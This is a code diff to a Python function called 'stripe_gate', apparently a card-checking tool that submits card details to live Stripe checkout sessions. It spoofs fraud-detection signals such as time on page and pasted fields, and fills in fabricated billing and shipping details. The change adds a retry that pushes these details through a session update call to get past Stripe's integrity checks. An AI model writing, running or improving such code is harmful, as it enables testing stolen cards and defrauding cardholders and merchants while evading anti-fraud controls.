@@ -510,7 +510,7 @@ async def stripe_gate(
 
         _elapsed = int((_time.monotonic() - _page_start) * 1000)
         fp["time_on_page"] = str(max(_elapsed, random.randint(8000, 25000)))
-        fp["pasted_fields"] = random.choice(["number", "number|cvc", ""])
+        fp["pasted_fields"] = random.choice(["number", "number|cvc"])
 
         pm_data = {
             "type": "card",
@@ -615,14 +615,11 @@ async def stripe_gate(
             "expected_payment_method_type": "card",
             "key": pk_live,
             "js_checksum": _get_js_encoded_string(newpm),
-            "email": email,
         }
         if init_checksum:
             confirm_data["init_checksum"] = init_checksum
         if _needs_tos:
             confirm_data["consent[terms_of_service]"] = "accepted"
-        if _needs_phone:
-            confirm_data["phone_number"] = phone
 
         try:
             r3 = await client.post(
@@ -644,25 +641,36 @@ async def stripe_gate(
             err = j3["error"]
             dcode, code, msg = err.get("decline_code", ""), err.get("code", ""), err.get("message", "")
 
-            # Session integrity error — retry with ALL details embedded in confirm
+            # Session integrity error — push missing fields via /update, then re-confirm
             if "error has occurred confirming" in msg.lower():
-                confirm_data["billing_address[name]"] = fullname
-                confirm_data["billing_address[line1]"] = addr["street"]
-                confirm_data["billing_address[city]"] = addr["city"]
-                confirm_data["billing_address[postal_code]"] = addr["zip"]
-                confirm_data["billing_address[country]"] = country
-                if addr.get("state"):
-                    confirm_data["billing_address[state]"] = addr["state"]
-                if _needs_shipping:
-                    confirm_data["shipping_address[name]"] = fullname
-                    confirm_data["shipping_address[address][line1]"] = addr["street"]
-                    confirm_data["shipping_address[address][city]"] = addr["city"]
-                    confirm_data["shipping_address[address][postal_code]"] = addr["zip"]
-                    confirm_data["shipping_address[address][country]"] = country
-                    if addr.get("state"):
-                        confirm_data["shipping_address[address][state]"] = addr["state"]
                 try:
-                    await asyncio.sleep(random.uniform(0.4, 0.8))
+                    await asyncio.sleep(random.uniform(0.3, 0.6))
+                    # Force-push email + billing + shipping via /update
+                    retry_data = {"email": email}
+                    retry_data["billing_address[name]"] = fullname
+                    retry_data["billing_address[line1]"] = addr["street"]
+                    retry_data["billing_address[city]"] = addr["city"]
+                    retry_data["billing_address[postal_code]"] = addr["zip"]
+                    retry_data["billing_address[country]"] = country
+                    if addr.get("state"):
+                        retry_data["billing_address[state]"] = addr["state"]
+                    if _needs_phone:
+                        retry_data["phone_number"] = phone
+                    if _needs_shipping:
+                        retry_data["shipping_address[name]"] = fullname
+                        retry_data["shipping_address[address][line1]"] = addr["street"]
+                        retry_data["shipping_address[address][city]"] = addr["city"]
+                        retry_data["shipping_address[address][postal_code]"] = addr["zip"]
+                        retry_data["shipping_address[address][country]"] = country
+                        if addr.get("state"):
+                            retry_data["shipping_address[address][state]"] = addr["state"]
+                    upd_res = await _session_update(client, cs_live, pk_live, retry_data, _checkout_hdrs)
+                    if upd_res:
+                        init_checksum = upd_res.get("init_checksum", init_checksum)
+                        if init_checksum:
+                            confirm_data["init_checksum"] = init_checksum
+
+                    await asyncio.sleep(random.uniform(0.3, 0.6))
                     r3 = await client.post(
                         f"https://api.stripe.com/v1/payment_pages/{cs_live}/confirm",
                         data=confirm_data, headers=_checkout_hdrs,
